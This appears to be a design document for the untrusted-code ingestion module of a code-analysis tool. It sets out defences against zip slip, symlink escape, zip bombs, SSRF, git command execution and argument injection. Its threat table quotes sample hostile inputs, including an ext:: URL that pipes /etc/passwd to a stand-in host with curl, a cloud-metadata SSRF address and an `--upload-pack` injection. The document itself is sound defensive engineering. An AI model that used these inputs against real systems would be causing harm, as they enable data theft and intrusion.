# Ingesting untrusted code

SentinelForge exists to analyse code written by other people, including code
that is broken, hostile, or specifically built to attack whatever opens it. The
whole of `backend/app/ingestion/` follows one rule:

> **Code that arrives here is data, never something to run.**

Nothing is executed, no build step is triggered, no script inside an archive or
repository is invoked, and no file keeps an execute bit.

## What an attacker can send, and what stops it

| Attack | What it looks like | Defence |
| --- | --- | --- |
| **Zip slip** | an entry named `../../etc/cron.d/backdoor` | every entry name is normalised (`\` → `/`), absolute paths, Windows drive paths and any `..` part are refused, and the resolved path must still be inside the destination |
| **Symlink escape** | a zip storing `config → /etc/shadow`; later phases read "its" files | symlink entries are refused outright; a clone is made with `core.symlinks=false`, so a committed link is checked out as a plain text file |
| **Special files** | a fifo or device node that blocks a reader forever | only regular files and directories are extracted |
| **Zip bomb** | 42 KB that expands to 4.5 PB | the declared expanded size and the compression ratio are checked *before* writing, and a byte counter enforces the same budget *during* writing, because the header is attacker-controlled |
| **Inode exhaustion** | an archive with a million empty files | `MAX_FILES` |
| **One enormous file** | a 2 GB minified bundle no parser should see | `MAX_FILE_BYTES`; the file is skipped, the rest of the archive still ingests |
| **Disk filling** | a huge upload, or a `Content-Length` that lies | the upload is streamed to a temporary file and aborted the moment it passes `MAX_ARCHIVE_BYTES` — the header is never trusted |
| **SSRF** | `https://169.254.169.254/latest/meta-data`, `https://10.0.0.5/`, `https://localhost:8000/` | the host is resolved and every address must be public: private, loopback, link-local, reserved, multicast and unspecified are refused |
| **Command execution via URL** | `ext::sh -c 'curl evil.example/$(cat /etc/passwd)'` | scheme allow-list (`https`, and `http` only if a deployment opts in), plus `protocol.ext.allow=never` and `protocol.file.allow=never` on the command itself |
| **Argument injection** | a URL or branch beginning with `-`, e.g. `--upload-pack=id` | both are validated, and `--` separates options from operands |
| **Credential capture** | `https://user:token@host/repo.git` | URLs carrying credentials are refused rather than stored |
| **Hanging clone** | a host that accepts the connection and never answers | `subprocess` timeout (`CLONE_TIMEOUT_SECONDS`); `GIT_TERMINAL_PROMPT=0` so a private repository fails instead of waiting for a password |
| **Repository-side code execution** | hooks, submodules, a malicious `.gitconfig` | `core.hooksPath=/dev/null`, `--no-recurse-submodules`, `GIT_CONFIG_NOSYSTEM=1`, global and system config pointed at `/dev/null`, and an environment containing nothing but `PATH` and those switches |
| **Information leak through errors** | git's stderr contains server paths | only recognised failures are translated into messages; anything else becomes "The repository could not be cloned" |

## Isolation

Every repository gets its own directory under `WORKSPACE_ROOT`:

```
<WORKSPACE_ROOT>/project-7/repo-12-9f3a1c02/
```

The random suffix means a re-ingest never lands in a stale directory. The
database stores the path **relative** to the root, so the root stays deployment
configuration rather than data, and `WorkspaceManager` refuses to touch any
resolved path outside it — a bug that deletes arbitrary directories is not
recoverable, so the check exists even though "it cannot happen".

`backend/workspaces/` is in `.gitignore`. Other people's source code never
enters the repository.

## Failure is recorded, not swallowed

A rejected archive or clone leaves a `repositories` row with
`status = FAILED`, a message safe to show the owner, and an audit entry
(`repository.ingest_failed`) that records the **error code**, never the
submitted bytes or URL contents. The workspace is deleted. The failure is then
committed deliberately, because the request itself ends in an error response
and would otherwise roll the row back.

## What is deliberately not done here

- **No virus scanning.** Files are stored and read, never opened by the OS.
- **No `tar.gz` support.** One archive format means one set of edge cases.
  Tar adds hard links, device nodes and PAX headers — more attack surface for
  no benefit while zip covers "Download ZIP" and every desktop OS.
- **No private-repository cloning.** That needs stored credentials or a GitHub
  App, which belongs in the DevSecOps phase with somewhere safe to keep them.
  Until then the honest answer is "upload a zip".
- **No background jobs yet.** Ingestion is synchronous, which is why the limits
  and the timeout matter. The `PENDING`/`INGESTING` states already exist so
  Phase 6 can move this to a worker without a migration.
